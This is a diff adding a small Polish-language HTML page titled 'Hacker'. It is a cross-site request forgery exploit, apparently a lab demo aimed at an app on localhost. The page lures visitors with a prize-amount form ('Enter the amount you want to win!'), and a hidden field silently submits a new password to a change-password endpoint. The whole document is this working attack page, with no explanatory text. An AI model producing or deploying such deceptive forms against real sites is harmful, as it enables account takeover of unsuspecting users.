@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>Hacker</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
+        integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+<div style="text-align: center">
+  <i class="fa-solid fa-hand-holding-dollar fa-10x"></i>
+  <h2>Wpisz kwotę, jaką chcesz wygrać!</h2>
+  <form method="POST" action="http://localhost:8080/change-password">
+    <input name="whatever" type="number" placeholder="Ile chcesz wygrać?">
+    <input name="newPassword" value="asdf1234" hidden>
+    <button>Sprawdź, czy wygrałeś</button>
+  </form>
+</div>
+</body>
+</html>
